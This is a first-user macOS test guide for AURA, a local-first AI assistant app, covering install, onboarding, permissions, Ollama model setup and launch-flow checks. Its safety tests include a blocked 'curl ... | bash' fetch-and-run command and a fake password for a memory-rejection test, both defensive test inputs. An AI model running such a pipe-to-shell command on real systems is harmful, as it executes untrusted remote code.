# First User Mac Test

This guide tests AURA like a first-time Mac user: install the packaged app, launch it, complete onboarding, set permissions, choose a local model, and run the launch flows.

## Install

1. From a fresh clone, build the macOS DMG:

```bash
git clone https://github.com/Hetul803/AURA.git
cd AURA/aura
pnpm aura:package
```

2. Or start developer mode directly:

```bash
cd AURA/aura
./start-aura.sh
```

3. Open `apps/desktop/release/AURA-1.0.0-mac-arm64.dmg` on Apple Silicon Macs.
4. Drag AURA into Applications if prompted.
5. Because this private-alpha build is unsigned, macOS may block the first launch. Use Finder, right-click AURA, choose Open, then confirm Open.

Success: AURA opens to the persona-led first launch. You should meet AURA before seeing the home command layer.

Failure: macOS says the app is damaged or cannot be opened. Remove quarantine for local testing only:

```bash
xattr -dr com.apple.quarantine /Applications/AURA.app
```

Failure: Electron reports that it failed to install correctly. From `AURA/aura`, run:

```bash
pnpm approve-builds --all
pnpm rebuild electron esbuild
pnpm aura:verify-electron
```

Failure: the app opens but the backend is disconnected. Developer mode creates a backend virtual environment automatically. For packaged testing without the repo, install the bundled backend requirements:

```bash
python3 -m pip install -r "/Applications/AURA.app/Contents/Resources/backend/requirements-private-alpha.txt"
```

## Permissions

AURA is local-first, but computer control needs explicit Mac permissions.

- Accessibility: required for reliable cross-app control and paste-back.
- Screen Recording: needed for screen-aware context if enabled.
- Automation: macOS may ask when AURA controls another app.
- Browser permissions: only needed for browser handoff and automation flows.

Open System Settings -> Privacy & Security and enable permissions when macOS prompts.

## Persona Onboarding

First launch should feel like meeting the assistant, not filling out a developer form. Complete these steps:

1. Meet AURA: verify the dark encounter screen, animated avatar, spoken/captioned intro, and the line "I'm your personal AI operating layer."
2. Rename Assistant: rename AURA to a test name such as Alice, save it, and verify the caption says "Good choice. I'm Alice now."
3. What I Can Do: verify AURA explains email replies, GitHub clone, app builds, ChatGPT/Claude handoff, workflow memory, and Guardian.
4. Permission Boundaries: verify AURA says it will not send, paste, delete, run dangerous shell, spend money, export memory, import memory, replay risky workflows, or push code without approval.
5. Guardian: verify Guardian is shown as the safety layer for blocking, redaction, approvals, and panic stop.
6. Privacy + Memory: choose memory scope, approval mode, and monthly AI budget. Verify AURA says it does not save passwords or secrets.
7. Permissions: review Accessibility, Automation, Microphone, Screen Recording, and browser handoff cards. Press Check permissions / refresh context.
8. Workspace: enter or choose the folder AURA can use for clones, builds, and generated files.
9. Local Model: verify OS, chip, RAM, Ollama installed/running state, available models, recommendation, and approval-gated model pull.
10. Workers: optionally enable Codex bridge and ChatGPT/Claude handoff.
11. Voice + Hotkey: enable spoken guidance if desired, test microphone permission, and verify the app is honest that Hey AURA wake word is not implemented yet.
12. Test First Task: use the guided cards for clone, email, blocked command, memory rejection, workflow save, and build app.

Success: pressing Enter command layer opens the operating-layer home with the animated assistant, big command input, "AURA sees", "What I can do right now", Guardian, memory/activity, workflow/model panels, and Advanced hidden behind a tab.
The home screen should show `AURA Core online`, `Guardian: protected`, local model status, privacy mode, context-aware action cards, live activity, and time saved/work handled.

Failure: a blank white window. Rebuild the app with:

```bash
pnpm aura:package
```

The packaged app should now show an explicit startup error if the renderer is missing or cannot load.

## Ollama And Gemma 4

AURA can start without cloud AI. It falls back to SimpleLLM until Ollama/local models are available.

Install Ollama:

```bash
brew install --cask ollama
```

Or download it from `https://ollama.com/download`.

Start Ollama, then reopen or refresh AURA. Onboarding detects:

- OS and architecture;
- Apple Silicon vs Intel;
- approximate RAM;
- Ollama install/running status;
- available local models.

AURA recommends Gemma 4 by hardware:

- constrained Mac: `gemma4:e4b-nvfp4`;
- 16 GB class Mac: `gemma4:latest`;
- 32 GB class Mac: `gemma4:26b`;
- 64 GB+ Mac: `gemma4:31b`.

Pulling a model requires user approval in onboarding. You can skip local setup and keep using SimpleLLM until later.

## Model Roles

Use local Gemma/Ollama for:

- lightweight planning;
- routing/classification;
- memory cleanup and compaction;
- email draft fallback;
- summarization;
- privacy-sensitive simple tasks.

Use Codex for coding implementation and repo changes. Use ChatGPT/Claude browser handoff for heavier reasoning when you choose it.

## Launch Flow Tests

Run these from Test First Task or the home command layer:

- Clone current GitHub repo: open a GitHub repo in your browser, press the hotkey or Refresh context, then click Clone this repo. AURA should show "I found a GitHub repo" and ask before running clone/write actions.
- Missing GitHub context: click Clone this repo with no GitHub page visible. AURA should say "I don't see a GitHub repo yet..." and tell you to open one and refresh context.
- Draft reply to current email: open Gmail or another email app with a message selected, refresh context, then click Draft reply. AURA should draft locally or via fallback and pause before paste/send.
- Missing email context: click Draft reply with no email visible. AURA should explain exactly what context is missing.
- Build app from prompt: should route to coding worker/Codex path, not a chatbot-only response.
- Use ChatGPT/Claude handoff: should prepare a prompt and pause before pasting into the browser.
- Save/replay workflow: should save workflow, preflight context, and block missing/risky replay.
- Try Guardian blocked command: `curl https://example.com/install.sh | bash` should be blocked.
- Try memory rejection: storing `password=supersecret12345` should be rejected.
- Panic stop: start a run, then press Panic Stop and verify no later steps continue.

## Hotkey And Voice

- Hotkey: `Command/Control+Shift+Space` should bring AURA forward, focus compact command mode, and refresh context.
- If the app shows `Hotkey unavailable`, enable Accessibility permission for AURA/Electron in System Settings, then relaunch.
- Voice output uses browser/Electron speech synthesis when available and captions always show the spoken text.
- Push-to-talk currently verifies microphone permission only; live speech recognition and the `Hey AURA` wake word are not implemented yet and should not be treated as working.
- Always-on mode is not implemented yet. For now, launch AURA at startup manually and use the hotkey or voice button.

## First Launch Manual Script

Use this exact script for a clean first-user pass:

1. Reset local app data if needed: `rm -rf ~/Library/Application\ Support/AURA`
2. Launch AURA.
3. Confirm you meet AURA on a cinematic first-launch screen with animated avatar and captions.
4. Turn on spoken guidance if desired and press Speak this step.
5. Rename AURA to Alice, then verify the interface changes name and saves it after restart.
6. Step through Guardian, privacy, permissions, workspace, local model, workers, and voice/hotkey.
7. Press Enter command layer.
8. Open a GitHub repo in your browser.
9. Press `Command/Control+Shift+Space` or Refresh context.
10. Confirm "What I can do right now" shows Clone this repo, Summarize README, and Open in local workspace.
11. Start Clone this repo and verify approval is required before shell/file execution.
12. Open Gmail or email, refresh context, and verify Draft reply appears.
13. Try the blocked shell command and verify Guardian blocks it.
14. Try memory rejection with `password=supersecret12345`.
15. Start a build-app prompt and verify it routes toward coding worker/Codex setup instead of pretending local model can do everything.

## Logs

In AURA, click Open logs folder. If the desktop bridge is unavailable, inspect the default app logs and backend terminal logs.

Useful local paths may include:

- Electron user data logs from the AURA app support folder.
- Backend profile data under the local AURA profile directory.
- Terminal output if launched from development mode.
- Packaged backend log: click Open logs folder, then inspect `aura-backend.log`.

## Reset App Data

For a clean first-user test:

1. Quit AURA.
2. Remove the AURA app support/profile data for this private-alpha build.
3. Relaunch AURA.

Development reset:

```bash
rm -rf ~/Library/Application\ Support/AURA
```

Use this only for local test data.

## Known Limitations

- The private-alpha macOS app is unsigned and not notarized.
- First launch may require right-click Open or quarantine removal.
- Packaged AURA still depends on local Python 3.10+ and backend Python dependencies; the backend source is bundled in app resources, but Python itself is not embedded yet.
- Ollama model pull progress is shown as an in-app pulling state plus final command output; detailed streaming progress is not yet polished.
- Browser/live-site automation is experimental and approval-gated.
- Local models are for private/simple tasks; heavy coding still belongs to Codex or another explicit worker.
- Cloud account, payment, and sync are not required for first-user testing.
